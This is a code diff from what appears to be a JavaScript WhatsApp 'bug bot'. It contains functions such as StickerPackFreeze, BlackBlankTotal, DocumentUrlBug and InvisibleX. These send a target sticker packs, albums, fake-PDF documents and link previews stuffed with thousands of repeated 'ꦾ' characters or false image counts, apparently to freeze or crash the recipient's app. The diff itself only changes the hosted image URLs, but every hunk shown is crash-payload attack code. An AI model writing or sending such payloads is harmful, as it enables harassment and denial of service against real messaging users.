@@ -91,14 +91,14 @@ async function StickerPackFreeze(bad, target) {
       packId: "ꦾ".repeat(10000),
       packName: "ꦾ".repeat(10000),
       publisher: "ꦾ".repeat(10000),
-      stickers: [{ url: "https://i.postimg.cc/L431k1zF/20260602-121105.jpg", fileSha256: Buffer.alloc(32), fileEncSha256: Buffer.alloc(32), mediaKey: Buffer.alloc(32), mimetype: "image/webp", height: 512, width: 512 }]
+      stickers: [{ url: "https://i.postimg.cc/D0VjjHWn/file-00000000083482068d50b99993db8182.png", fileSha256: Buffer.alloc(32), fileEncSha256: Buffer.alloc(32), mediaKey: Buffer.alloc(32), mimetype: "image/webp", height: 512, width: 512 }]
     }
   }, {});
 }
 
 // 5. BlankNew (Album Bug)
 async function BlackBlankTotal(bad, target) {
-  const photo = { image: { url: "https://i.postimg.cc/L431k1zF/20260602-121105.jpg" }, caption: "Black Bull Bro" };
+  const photo = { image: { url: "https://i.postimg.cc/D0VjjHWn/file-00000000083482068d50b99993db8182.png" }, caption: "Black Bull Bro" };
   const album = await generateWAMessageFromContent(target, {
     albumMessage: { expectedImageCount: 100, expectedVideoCount: 0 }
   }, { userJid: target, upload: bad.waUploadToServer });
@@ -128,7 +128,7 @@ async function DelayBug(bad, target) {
 // 8. Document URL Bug
 async function DocumentUrlBug(bad, target) {
   await bad.sendMessage(target, {
-    document: { url: "https://i.postimg.cc/L431k1zF/20260602-121105.jpg" },
+    document: { url: "https://i.postimg.cc/D0VjjHWn/file-00000000083482068d50b99993db8182.png" },
     mimetype: "application/pdf",
     fileName: "Bugged.pdf",
     caption: "ꦾ".repeat(5000)
@@ -166,7 +166,7 @@ async function InvisibleX(bad, target) {
         title: "ꦾ".repeat(5000),
         body: "ꦾ".repeat(5000),
         mediaType: 1,
-        thumbnailUrl: "https://i.postimg.cc/L431k1zF/20260602-121105.jpg"
+        thumbnailUrl: "https://i.postimg.cc/D0VjjHWn/file-00000000083482068d50b99993db8182.png"
       }
     }
   });
